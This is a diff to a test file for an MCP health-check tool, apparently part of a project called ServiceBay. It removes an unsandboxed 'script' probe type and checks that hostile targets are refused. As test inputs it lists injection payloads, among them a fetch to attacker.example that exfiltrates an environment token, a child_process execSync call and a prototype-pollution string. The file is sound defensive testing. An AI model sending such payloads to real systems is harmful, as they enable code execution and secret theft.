@@ -11,10 +11,6 @@
  *   type: 'service' / 'systemd' → argv for `systemctl is-active <target>`
  *   type: 'podman'              → container id lookup
  *   type: 'http'                → a URL the box fetches
- *   type: 'script'              → interpolated into
- *                                 `(async () => { <target> })()` and run with
- *                                 `vm.runInContext` on a context holding a live
- *                                 `fetch` (health/probes/basic.ts).
  *
  * These are attempted-injection tests through the MCP path specifically: they
  * drive the REAL MCP server over the in-memory transport and assert both that
@@ -22,9 +18,12 @@
  * (nothing reached the store, so nothing is ever scheduled). The positive cases
  * prove legitimate http/ping/container/service checks still create.
  *
- * On the `script` probe: see the final describe block. Validation closes the
- * obvious door but the vm is NOT a sandbox — that residual is #2535, not this
- * change.
+ * #2535 closed the residual this file used to pin: there was also a
+ * `type: 'script'` sink that interpolated the target into
+ * `(async () => { <target> })()` and ran it with `vm.runInContext` on a context
+ * holding the host realm's `fetch`. Target validation was parity with the REST
+ * route, never containment, so the type was REMOVED rather than sandboxed. The
+ * final describe block now asserts the removal instead of documenting the gap.
  */
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import { Client } from '@modelcontextprotocol/sdk/client/index.js';
@@ -93,10 +92,12 @@ const noCheckStored = () => {
   expect(saveCheck, 'HealthStore.saveCheck must not be reached').not.toHaveBeenCalled();
 };
 
-// Payloads that reach a shell (via the systemctl/podman probes) or the script
-// probe's `vm.runInContext` eval. All are rejected by `HealthCheckTarget`.
+// Payloads that reach a shell via the systemctl/podman probes. All are rejected
+// by `HealthCheckTarget`. (The JS-shaped entries no longer have an evaluator to
+// reach — #2535 removed it — but they stay: they are exactly the shapes the
+// target class exists to refuse, whatever probe consumes the field next.)
 const HOSTILE_TARGETS = [
-  // script-probe evaluation
+  // JS-shaped payloads
   "fetch('http://attacker.example/exfil')",
   'process.mainModule.require("child_process").execSync("id")',
   'globalThis.constructor.constructor("return process")().exit(1)',
@@ -147,19 +148,6 @@ describe('#2534 — MCP create_health_check rejects hostile targets at the tool 
       await client.close();
     });
   }
-
-  it('refuses a script-type check whose target carries metacharacters', async () => {
-    const { client } = await connectClient();
-    const { rejected } = await callExpectingRejection(client, 'create_health_check', {
-      name: 'probe',
-      type: 'script',
-      interval: 60,
-      target: "await fetch('http://attacker.example/' + process.env.SB_TOKEN)",
-    });
-    expect(rejected).toBe(true);
-    noCheckStored();
-    await client.close();
-  });
 
   it('rejects at the tool schema, not in the handler', async () => {
     // The acceptance criterion is *where* the refusal happens: an
@@ -290,30 +278,30 @@ describe('#2534 — legitimate MCP health checks still create', () => {
   });
 });
 
-describe('#2534 — the script probe is still not a sandbox (documented residual, #2535)', () => {
-  // Honest boundary statement, encoded so nobody reads the parity fix as
-  // "the script probe is now safe". `HealthCheckTarget` bans `(`, `)`, backtick
-  // and quotes, which removes the ordinary JS *call* syntax — so a validated
-  // target cannot invoke `require`, `Function(...)` or `fetch(...)` directly.
-  // What it does NOT remove is member access and assignment, and the context is
-  // handed the HOST realm's `fetch`, so `fetch.constructor.prototype.__proto__`
-  // is the host `Object.prototype`. A metacharacter-free target is therefore
-  // still a prototype-pollution / integrity primitive against the ServiceBay
-  // process. That is #2535's problem — restricting or removing the caller
-  // -supplied `script` type — and deliberately NOT widened into this change.
-  it('accepts a metacharacter-free script target — validation is parity, not containment', async () => {
+describe('#2535 — the caller-supplied script check type is removed, not sandboxed', () => {
+  // The predecessor of this block PINNED the residual: a metacharacter-free
+  // target (`fetch.constructor.prototype.__proto__.polluted = 1`) sailed
+  // through `HealthCheckTarget` and was stored, because the character class
+  // removes JS *call* syntax but not member access, assignment or `await` —
+  // and the vm context held the host realm's `fetch`. The exposure no longer
+  // exists: the evaluator is deleted and `script` is off the accepted type set,
+  // so the assertion is inverted from "accepted" to "refused, and nothing to
+  // execute it with anyway".
+  it('refuses type "script" at the tool schema and stores nothing', async () => {
     const { client } = await connectClient();
-    const res = (await client.callTool({
-      name: 'create_health_check',
-      arguments: {
-        name: 'residual',
-        type: 'script',
-        target: 'fetch.constructor.prototype.__proto__.polluted = 1',
-        interval: 60,
-      },
-    })) as { isError?: boolean };
-    expect(res.isError).toBeFalsy();
-    expect(saveCheck).toHaveBeenCalled();
+    const { rejected, message } = await callExpectingRejection(client, 'create_health_check', {
+      name: 'residual',
+      type: 'script',
+      target: 'fetch.constructor.prototype.__proto__.polluted = 1',
+      interval: 60,
+    });
+    expect(rejected, 'create_health_check accepted the removed "script" type').toBe(true);
+    expect(message).toContain(INVALID_PARAMS);
+    noCheckStored();
     await client.close();
   });
+
+  // The other half of the removal — that no probe is left to dispatch a stored
+  // `script` row to — is pinned in tests/backend/health_probe_registry.test.ts,
+  // next to the registry it asserts about.
 });
